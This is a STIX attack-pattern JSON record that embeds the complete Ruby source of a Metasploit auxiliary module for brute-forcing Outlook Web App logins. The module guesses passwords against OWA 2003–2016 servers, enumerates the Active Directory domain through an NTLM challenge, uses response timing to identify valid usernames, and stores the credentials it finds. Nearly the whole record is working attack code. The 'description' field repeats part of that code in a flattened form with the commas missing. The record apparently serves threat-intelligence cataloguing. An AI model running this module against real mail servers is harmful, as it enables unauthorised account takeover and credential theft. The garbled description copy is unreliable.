{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--af34eee3-c5eb-48c2-9561-44eaf15604e5",
    "created": "2024-08-14T16:29:23.36133Z",
    "modified": "2024-08-14T16:29:23.361335Z",
    "name": "Outlook Web App (OWA) Brute Force Utility",
    "description": "OWA version 2016 'AuthPath'    => '/owa/auth.owa' 'InboxPath'   => '/owa/' 'InboxCheck'  => /Inbox|logoff\\.owa/  ] ] 'DefaultAction' => 'OWA_2013' 'DefaultOptions' => { 'SSL' => true  )  register_options( [ OptInt.new('RPORT', [ true, \"The target port\", 443]) OptAddress.new('RHOST', [ true, \"The target address\" ]) OptBool.new('ENUM_DOMAIN', [ true, \"Automatically enumerate AD domain using NTLM authentication\", true]) OptBool.new('AUTH_TIME', [ false, \"Check HTTP authentication response time\", true]) ])   register_advanced_options( [ OptString.new('AD_DOMAIN', [ false, \"Optional AD domain to prepend to usernames\", '']) OptFloat.new('BaselineAuthTime', [ false, \"Baseline HTTP authentication response time for invalid users\", 1.0]) ])  deregister_options('BLANK_PASSWORDS', 'RHOSTS') end  def setup # Here's a weird hack to check if each_user_pass is empty or not # apparently you cannot do each_user_pass.empty? or even inspect() it isempty = true each_user_pass do |user| isempty = false break end raise ArgumentError, \"No username/password specified\" if isempty end  def run vhost = datastore['VHOST'] || datastore['RHOST']  print_status(\"#{msg} Testing version #{action.name}\")  auth_path   = action.opts['AuthPath'] inbox_path  = action.opts['InboxPath'] login_check = action.opts['InboxCheck']  domain = nil  if datastore['AD_DOMAIN'] and not datastore['AD_DOMAIN'].empty? domain = datastore['AD_DOMAIN'] end  if ((datastore['AD_DOMAIN'].nil? or datastore['AD_DOMAIN'] == '') and datastore['ENUM_DOMAIN']) domain = get_ad_domain end  begin each_user_pass do |user, pass| next if (user.blank? or pass.blank?) vprint_status(\"#{msg} Trying #{user} : #{pass}\") try_user_pass({ user: user domain: domain pass: pass auth_path: auth_path inbox_path: inbox_path login_check: login_check vhost: vhost }) end rescue ::Rex::ConnectionError, Errno::ECONNREFUSED print_error(\"#{msg} HTTP Connection Error, Aborting\") end end  def try_user_pass(opts) user = opts[:user] pass = opts[:pass] auth_path = opts[:auth_path] inbox_path = opts[:inbox_path] login_check = opts[:login_check] vhost = opts[:vhost] domain = opts[:domain]  user = domain + '\\\\' + user if domain  headers = { 'Cookie' => 'PBack=0'   if datastore['SSL'] if [\"OWA_2013\", \"OWA_2016\"].include?(action.name) data = 'destination=https://' << vhost << '/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << pass << '&isUtf8=1' else data = 'destination=https://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass end else if [\"OWA_2013\", \"OWA_2016\"].include?(action.name) data = 'destination=http://' << vhost << '/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << pass << '&isUtf8=1' else data = 'destination=http://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass end end  begin if datastore['AUTH_TIME'] start_time = Time.now end baseline = datastore['BaselineAuthTime'] || 1.0  res = send_request_cgi({ 'encode'   => true 'uri'      => auth_path 'method'   => 'POST' 'headers'  => headers 'data'     => data })  if datastore['AUTH_TIME'] elapsed_time = Time.now - start_time end rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT print_error(\"#{msg} HTTP Connection Failed, Aborting\") return :abort end  if not res print_error(\"#{msg} HTTP Connection Error, Aborting\") return end  if res.peerinfo['addr'] != datastore['RHOST'] vprint_status(\"#{msg} Resolved hostname '#{datastore['RHOST']}' to address #{res.peerinfo['addr']}\") end  if ![\"OWA_2013\", \"OWA_2016\"].include?(action.name) && res.get_cookies.empty? print_error(\"#{msg} Received invalid repsonse due to a missing cookie (possibly due to invalid version), aborting\") return :abort end if [\"OWA_2013\", \"OWA_2016\"].include?(action.name) # Check for a response code to make sure login was valid. Changes from 2010 to 2013 / 2016 # Check if the password needs to be changed. if res.headers['location'] =~ /expiredpassword/ print_good(\"#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}': NOTE password change required\") report_cred( ip: res.peerinfo['addr'] port: datastore['RPORT'] service_name: 'owa' user: user password: pass ) return :next_user end  # No password change required moving on. # Check for valid login but no mailbox setup print_good(\"server type: #{res.headers[\"X-FEServer\"]}\") if res.headers['location'] =~ /owa/ and res.headers['location'] !~ /reason/ print_good(\"#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}'\") report_cred( ip: res.peerinfo['addr'] port: datastore['RPORT'] service_name: 'owa' user: user password: pass ) return :next_user end  unless location = res.headers['location'] print_error(\"#{msg} No HTTP redirect.  This is not OWA 2013 / 2016 system, aborting.\") return :abort end reason = location.split('reason=')[1] if reason == nil headers['Cookie'] = 'PBack=0;' << res.get_cookies else # Login didn't work. no point in going on, however, check if valid domain account by response time. if elapsed_time && elapsed_time <= baseline unless user =~ /@\\w+\\.\\w+/ report_cred( ip: res.peerinfo['addr'] port: datastore['RPORT'] service_name: 'owa' user: user ) print_status(\"#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS\") return :Skip_pass end else vprint_error(\"#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (HTTP redirect with reason #{reason})\") return :Skip_pass end end else # The authentication info is in the cookies on this response cookies = res.get_cookies cookie_header = 'PBack=0' %w(sessionid cadata).each do |necessary_cookie| if cookies =~ /#{necessary_cookie}=([^;]*)/ cookie_header << \"; #{Regexp.last_match(1)}\" else print_error(\"#{msg} Missing #{necessary_cookie} cookie.  This is not OWA 2010, aborting\") return :abort end end headers['Cookie'] = cookie_header end  begin res = send_request_cgi({ 'uri'       => inbox_path 'method'    => 'GET' 'headers'   => headers }, 20) rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT print_error(\"#{msg} HTTP Connection Failed, Aborting\") return :abort end  if not res print_error(\"#{msg} HTTP Connection Error, Aborting\") return :abort end  if res.redirect? if elapsed_time && elapsed_time <= baseline unless user =~ /@\\w+\\.\\w+/ report_cred( ip: res.peerinfo['addr'] port: datastore['RPORT'] service_name: 'owa' user: user ) print_status(\"#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS\") return :Skip_pass end else vprint_error(\"#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response was a #{res.code} redirect)\") return :skip_pass end end  if res.body =~ login_check print_good(\"#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}'\") report_cred( ip: res.peerinfo['addr'] port: datastore['RPORT'] service_name: 'owa' user: user password: pass ) return :next_user else if elapsed_time && elapsed_time <= baseline unless user =~ /@\\w+\\.\\w+/ report_cred( ip: res.peerinfo['addr'] port: datastore['RPORT'] service_name: 'owa' user: user ) print_status(\"#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS\") return :Skip_pass end else vprint_error(\"#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response body did not match)\") return :skip_pass end end end  def get_ad_domain urls = ['aspnet_client' 'Autodiscover' 'ecp' 'EWS' 'Microsoft-Server-ActiveSync' 'OAB' 'PowerShell' 'Rpc']  domain = nil  urls.each do |url| begin res = send_request_cgi({ 'encode'   => true 'uri'      => \"/#{url}\" 'method'   => 'GET' 'headers'  =>  {'Authorization' => 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==' }) rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT vprint_error(\"#{msg} HTTP Connection Failed\") next end  if not res vprint_error(\"#{msg} HTTP Connection Timeout\") next end  if res && res.code == 401 && res.headers.has_key?('WWW-Authenticate') && res.headers['WWW-Authenticate'].match(/^NTLM/i) hash = res['WWW-Authenticate'].split('NTLM ')[1] domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\\0/,'') print_good(\"Found target domain: #{domain}\") return domain end end  return domain end  def report_cred(opts) service_data = { address: opts[:ip] port: opts[:port] service_name: opts[:service_name] protocol: 'tcp' workspace_id: myworkspace_id   # Test if password was passed, if so, add private_data. If not, assuming only username was found if opts.has_key?(:password) credential_data = { origin_type: :service module_fullname: fullname username: opts[:user] private_data: opts[:password] private_type: :password }.merge(service_data) else credential_data = { origin_type: :service module_fullname: fullname username: opts[:user] }.merge(service_data) end  login_data = { core: create_credential(credential_data) last_attempted_at: DateTime.now status: Metasploit::Model::Login::Status::SUCCESSFUL }.merge(service_data)  create_credential_login(login_data) end  def msg \"#{vhost}:#{rport} OWA -\" end end",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/owa_login.rb",
            "external_id": "owa_login.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n\n  def initialize\n    super(\n      'Name'           => 'Outlook Web App (OWA) Brute Force Utility',\n      'Description'    => %q{\n        This module tests credentials on OWA 2003, 2007, 2010, 2013, and 2016 servers.\n      },\n      'Author'         =>\n        [\n          'Vitor Moreira',\n          'Spencer McIntyre',\n          'SecureState R&D Team',\n          'sinn3r',\n          'Brandon Knight',\n          'Pete (Bokojan) Arzamendi', # Outlook 2013 updates\n          'Nate Power',                # HTTP timing option\n          'Chapman (R3naissance) Schleiss', # Save username in creds if response is less\n          'Andrew Smith' # valid creds, no mailbox\n        ],\n      'License'        => MSF_LICENSE,\n      'Actions'        =>\n        [\n          [\n            'OWA_2003',\n            {\n              'Description' => 'OWA version 2003',\n              'AuthPath'    => '/exchweb/bin/auth/owaauth.dll',\n              'InboxPath'   => '/exchange/',\n              'InboxCheck'  => /Inbox/\n            }\n          ],\n          [\n            'OWA_2007',\n            {\n              'Description' => 'OWA version 2007',\n              'AuthPath'    => '/owa/auth/owaauth.dll',\n              'InboxPath'   => '/owa/',\n              'InboxCheck'  => /addrbook.gif/\n            }\n          ],\n          [\n            'OWA_2010',\n            {\n              'Description' => 'OWA version 2010',\n              'AuthPath'    => '/owa/auth.owa',\n              'InboxPath'   => '/owa/',\n              'InboxCheck'  => /Inbox|location(\\x20*)=(\\x20*)\"\\\\\\/(\\w+)\\\\\\/logoff\\.owa|A mailbox couldn\\'t be found|\\<a .+onclick=\"return JumpTo\\('logoff\\.aspx.+\\\">/\n            }\n          ],\n          [\n            'OWA_2013',\n            {\n              'Description' => 'OWA version 2013',\n              'AuthPath'    => '/owa/auth.owa',\n              'InboxPath'   => '/owa/',\n              'InboxCheck'  => /Inbox|logoff\\.owa/\n            }\n          ],\n          [\n            'OWA_2016',\n            {\n              'Description' => 'OWA version 2016',\n              'AuthPath'    => '/owa/auth.owa',\n              'InboxPath'   => '/owa/',\n              'InboxCheck'  => /Inbox|logoff\\.owa/\n            }\n          ]\n        ],\n      'DefaultAction' => 'OWA_2013',\n      'DefaultOptions' => {\n        'SSL' => true\n      }\n    )\n\n    register_options(\n      [\n        OptInt.new('RPORT', [ true, \"The target port\", 443]),\n        OptAddress.new('RHOST', [ true, \"The target address\" ]),\n        OptBool.new('ENUM_DOMAIN', [ true, \"Automatically enumerate AD domain using NTLM authentication\", true]),\n        OptBool.new('AUTH_TIME', [ false, \"Check HTTP authentication response time\", true])\n      ])\n\n\n    register_advanced_options(\n      [\n        OptString.new('AD_DOMAIN', [ false, \"Optional AD domain to prepend to usernames\", '']),\n        OptFloat.new('BaselineAuthTime', [ false, \"Baseline HTTP authentication response time for invalid users\", 1.0])\n      ])\n\n    deregister_options('BLANK_PASSWORDS', 'RHOSTS')\n  end\n\n  def setup\n    # Here's a weird hack to check if each_user_pass is empty or not\n    # apparently you cannot do each_user_pass.empty? or even inspect() it\n    isempty = true\n    each_user_pass do |user|\n      isempty = false\n      break\n    end\n    raise ArgumentError, \"No username/password specified\" if isempty\n  end\n\n  def run\n    vhost = datastore['VHOST'] || datastore['RHOST']\n\n    print_status(\"#{msg} Testing version #{action.name}\")\n\n    auth_path   = action.opts['AuthPath']\n    inbox_path  = action.opts['InboxPath']\n    login_check = action.opts['InboxCheck']\n\n    domain = nil\n\n    if datastore['AD_DOMAIN'] and not datastore['AD_DOMAIN'].empty?\n      domain = datastore['AD_DOMAIN']\n    end\n\n    if ((datastore['AD_DOMAIN'].nil? or datastore['AD_DOMAIN'] == '') and datastore['ENUM_DOMAIN'])\n      domain = get_ad_domain\n    end\n\n    begin\n      each_user_pass do |user, pass|\n        next if (user.blank? or pass.blank?)\n        vprint_status(\"#{msg} Trying #{user} : #{pass}\")\n        try_user_pass({\n          user: user,\n          domain: domain,\n          pass: pass,\n          auth_path: auth_path,\n          inbox_path: inbox_path,\n          login_check: login_check,\n          vhost: vhost\n        })\n      end\n    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED\n      print_error(\"#{msg} HTTP Connection Error, Aborting\")\n    end\n  end\n\n  def try_user_pass(opts)\n    user = opts[:user]\n    pass = opts[:pass]\n    auth_path = opts[:auth_path]\n    inbox_path = opts[:inbox_path]\n    login_check = opts[:login_check]\n    vhost = opts[:vhost]\n    domain = opts[:domain]\n\n    user = domain + '\\\\' + user if domain\n\n    headers = {\n      'Cookie' => 'PBack=0'\n    }\n\n    if datastore['SSL']\n      if [\"OWA_2013\", \"OWA_2016\"].include?(action.name)\n        data = 'destination=https://' << vhost << '/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << pass << '&isUtf8=1'\n      else\n        data = 'destination=https://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass\n      end\n    else\n      if [\"OWA_2013\", \"OWA_2016\"].include?(action.name)\n        data = 'destination=http://' << vhost << '/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << pass << '&isUtf8=1'\n      else\n        data = 'destination=http://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass\n      end\n    end\n\n    begin\n      if datastore['AUTH_TIME']\n        start_time = Time.now\n      end\n      baseline = datastore['BaselineAuthTime'] || 1.0\n\n      res = send_request_cgi({\n        'encode'   => true,\n        'uri'      => auth_path,\n        'method'   => 'POST',\n        'headers'  => headers,\n        'data'     => data\n      })\n\n      if datastore['AUTH_TIME']\n        elapsed_time = Time.now - start_time\n      end\n    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT\n      print_error(\"#{msg} HTTP Connection Failed, Aborting\")\n      return :abort\n    end\n\n    if not res\n      print_error(\"#{msg} HTTP Connection Error, Aborting\")\n      return\n    end\n\n    if res.peerinfo['addr'] != datastore['RHOST']\n      vprint_status(\"#{msg} Resolved hostname '#{datastore['RHOST']}' to address #{res.peerinfo['addr']}\")\n    end\n\n    if ![\"OWA_2013\", \"OWA_2016\"].include?(action.name) && res.get_cookies.empty?\n        print_error(\"#{msg} Received invalid repsonse due to a missing cookie (possibly due to invalid version), aborting\")\n        return :abort\n    end\n    if [\"OWA_2013\", \"OWA_2016\"].include?(action.name)\n      # Check for a response code to make sure login was valid. Changes from 2010 to 2013 / 2016\n      # Check if the password needs to be changed.\n      if res.headers['location'] =~ /expiredpassword/\n        print_good(\"#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}': NOTE password change required\")\n        report_cred(\n          ip: res.peerinfo['addr'],\n          port: datastore['RPORT'],\n          service_name: 'owa',\n          user: user,\n          password: pass\n        )\n        return :next_user\n      end\n\n      # No password change required moving on.\n      # Check for valid login but no mailbox setup\n      print_good(\"server type: #{res.headers[\"X-FEServer\"]}\")\n      if res.headers['location'] =~ /owa/ and res.headers['location'] !~ /reason/\n        print_good(\"#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}'\")\n        report_cred(\n          ip: res.peerinfo['addr'],\n          port: datastore['RPORT'],\n          service_name: 'owa',\n          user: user,\n          password: pass\n        )\n        return :next_user\n      end\n\n      unless location = res.headers['location']\n        print_error(\"#{msg} No HTTP redirect.  This is not OWA 2013 / 2016 system, aborting.\")\n        return :abort\n      end\n      reason = location.split('reason=')[1]\n      if reason == nil\n        headers['Cookie'] = 'PBack=0;' << res.get_cookies\n      else\n        # Login didn't work. no point in going on, however, check if valid domain account by response time.\n        if elapsed_time && elapsed_time <= baseline\n          unless user =~ /@\\w+\\.\\w+/\n            report_cred(\n              ip: res.peerinfo['addr'],\n              port: datastore['RPORT'],\n              service_name: 'owa',\n              user: user\n            )\n            print_status(\"#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS\")\n            return :Skip_pass\n          end\n        else\n          vprint_error(\"#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (HTTP redirect with reason #{reason})\")\n          return :Skip_pass\n        end\n      end\n    else\n       # The authentication info is in the cookies on this response\n      cookies = res.get_cookies\n      cookie_header = 'PBack=0'\n      %w(sessionid cadata).each do |necessary_cookie|\n        if cookies =~ /#{necessary_cookie}=([^;]*)/\n          cookie_header << \"; #{Regexp.last_match(1)}\"\n        else\n          print_error(\"#{msg} Missing #{necessary_cookie} cookie.  This is not OWA 2010, aborting\")\n          return :abort\n        end\n      end\n      headers['Cookie'] = cookie_header\n    end\n\n    begin\n      res = send_request_cgi({\n        'uri'       => inbox_path,\n        'method'    => 'GET',\n        'headers'   => headers\n      }, 20)\n    rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT\n      print_error(\"#{msg} HTTP Connection Failed, Aborting\")\n      return :abort\n    end\n\n    if not res\n      print_error(\"#{msg} HTTP Connection Error, Aborting\")\n      return :abort\n    end\n\n    if res.redirect?\n      if elapsed_time && elapsed_time <= baseline\n        unless user =~ /@\\w+\\.\\w+/\n          report_cred(\n            ip: res.peerinfo['addr'],\n            port: datastore['RPORT'],\n            service_name: 'owa',\n            user: user\n          )\n          print_status(\"#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS\")\n          return :Skip_pass\n        end\n      else\n        vprint_error(\"#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response was a #{res.code} redirect)\")\n        return :skip_pass\n      end\n    end\n\n    if res.body =~ login_check\n      print_good(\"#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}'\")\n      report_cred(\n        ip: res.peerinfo['addr'],\n        port: datastore['RPORT'],\n        service_name: 'owa',\n        user: user,\n        password: pass\n      )\n      return :next_user\n    else\n      if elapsed_time && elapsed_time <= baseline\n        unless user =~ /@\\w+\\.\\w+/\n          report_cred(\n            ip: res.peerinfo['addr'],\n            port: datastore['RPORT'],\n            service_name: 'owa',\n            user: user\n          )\n          print_status(\"#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS\")\n          return :Skip_pass\n        end\n      else\n        vprint_error(\"#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response body did not match)\")\n        return :skip_pass\n      end\n    end\n  end\n\n  def get_ad_domain\n    urls = ['aspnet_client',\n      'Autodiscover',\n      'ecp',\n      'EWS',\n      'Microsoft-Server-ActiveSync',\n      'OAB',\n      'PowerShell',\n      'Rpc']\n\n    domain = nil\n\n    urls.each do |url|\n      begin\n        res = send_request_cgi({\n          'encode'   => true,\n          'uri'      => \"/#{url}\",\n          'method'   => 'GET',\n          'headers'  =>  {'Authorization' => 'NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw=='}\n        })\n      rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT\n        vprint_error(\"#{msg} HTTP Connection Failed\")\n        next\n      end\n\n      if not res\n        vprint_error(\"#{msg} HTTP Connection Timeout\")\n        next\n      end\n\n      if res && res.code == 401 && res.headers.has_key?('WWW-Authenticate') && res.headers['WWW-Authenticate'].match(/^NTLM/i)\n        hash = res['WWW-Authenticate'].split('NTLM ')[1]\n        domain = Rex::Proto::NTLM::Message.parse(Rex::Text.decode_base64(hash))[:target_name].value().gsub(/\\0/,'')\n        print_good(\"Found target domain: #{domain}\")\n        return domain\n      end\n    end\n\n    return domain\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    # Test if password was passed, if so, add private_data. If not, assuming only username was found\n    if opts.has_key?(:password)\n      credential_data = {\n        origin_type: :service,\n        module_fullname: fullname,\n        username: opts[:user],\n        private_data: opts[:password],\n        private_type: :password\n      }.merge(service_data)\n    else\n      credential_data = {\n        origin_type: :service,\n        module_fullname: fullname,\n        username: opts[:user]\n      }.merge(service_data)\n    end\n\n    login_data = {\n      core: create_credential(credential_data),\n      last_attempted_at: DateTime.now,\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def msg\n    \"#{vhost}:#{rport} OWA -\"\n  end\nend\n"
}